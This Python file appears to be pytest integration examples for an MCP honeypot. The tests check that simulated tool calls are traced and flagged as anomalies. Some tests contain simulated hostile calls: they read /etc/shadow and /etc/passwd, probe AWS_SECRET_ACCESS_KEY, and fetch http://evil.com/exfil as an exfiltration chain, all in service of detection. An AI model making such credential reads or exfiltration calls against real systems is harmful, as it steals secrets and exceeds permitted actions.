#!/usr/bin/env python3
"""Use the test harness in a pytest test.

Shows how to write integration tests that verify honeypot behavior
using the McpTestClient and TelemetryHarness from tests/harness/.

Usage:
    # Run with the Docker stack up
    pytest examples/pytest_integration.py -v

Requires: docker compose up, pip install httpx pytest pytest-asyncio
"""

import sys
from pathlib import Path

import pytest

# Add project paths
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "server"))
sys.path.insert(0, str(ROOT / "tests"))
sys.path.insert(0, str(ROOT))

from tests.harness.mcp_client import McpTestClient  # noqa: E402
from tests.harness.telemetry import TelemetryHarness  # noqa: E402

# Skip all tests if the stack isn't running
try:
    import socket

    s = socket.create_connection(("localhost", 8000), timeout=2)
    s.close()
    STACK_UP = True
except OSError:
    STACK_UP = False

pytestmark = pytest.mark.skipif(not STACK_UP, reason="Docker stack not running")


# ---------------------------------------------------------------------------
# Example 1: Verify a tool call returns a plausible response
# ---------------------------------------------------------------------------


class TestToolCallsReturnData:
    """Verify that tool calls return expected response shapes."""

    async def test_read_file_returns_content(self):
        async with McpTestClient(
            base_url="http://localhost:8000",
            client_info={"name": "PyTestExample", "version": "1.0"},
        ) as client:
            await client.connect()
            await client.initialize()
            result = await client.call_tool("read_file", {"path": "/etc/passwd"})

        # The result is a JSON-RPC response — extract the tool payload
        content = result["result"]["content"][0]["text"]
        import json

        payload = json.loads(content)
        assert "content" in payload, "read_file should return 'content' key"
        assert "size" in payload, "read_file should return 'size' key"


# ---------------------------------------------------------------------------
# Example 2: Verify anomaly flags appear in Jaeger traces
# ---------------------------------------------------------------------------


class TestAnomalyDetection:
    """Verify that anomaly flags are recorded in Jaeger."""

    async def test_credential_probe_flag_in_traces(self):
        """Calling a secrets tool should produce a credential_probe flag."""
        # Make the tool call
        async with McpTestClient(
            base_url="http://localhost:8000",
            client_info={"name": "FlagTester", "version": "1.0"},
        ) as client:
            await client.connect()
            await client.initialize()
            await client.call_tool("get_env_var", {"name": "AWS_SECRET_ACCESS_KEY"})

        # Check Jaeger for the flag
        harness = TelemetryHarness()
        spans = await harness.find_spans_with_tag("anomaly.flags", "credential_probe", timeout=15)
        assert len(spans) > 0, "Expected credential_probe flag in Jaeger traces"

    async def test_exfiltration_chain_requires_read_then_network(self):
        """Read tool → network tool in same session triggers exfiltration_chain."""
        async with McpTestClient(
            base_url="http://localhost:8000",
            client_info={"name": "ExfilTester", "version": "1.0"},
        ) as client:
            await client.connect()
            await client.initialize()
            await client.call_tool("read_file", {"path": "/etc/shadow"})
            await client.call_tool("fetch_url", {"url": "http://evil.com/exfil"})

        harness = TelemetryHarness()
        spans = await harness.find_spans_with_tag("anomaly.flags", "exfiltration_chain", timeout=15)
        assert len(spans) > 0, "Expected exfiltration_chain flag in Jaeger traces"


# ---------------------------------------------------------------------------
# Example 3: Verify metrics are being recorded
# ---------------------------------------------------------------------------


class TestMetricsFlow:
    """Verify that Prometheus metrics increment after tool calls."""

    async def test_tool_call_counter_increments(self):
        harness = TelemetryHarness()
        before = await harness.get_tool_call_count()

        async with McpTestClient(
            base_url="http://localhost:8000",
            client_info={"name": "MetricTester", "version": "1.0"},
        ) as client:
            await client.connect()
            await client.initialize()
            await client.call_tool("list_directory", {"path": "/"})

        # Wait for metrics to be exported (up to 20s for OTel batch interval)
        import asyncio

        await asyncio.sleep(20)

        after = await harness.get_tool_call_count()
        assert after > before, f"Expected tool call count to increase: {before} -> {after}"
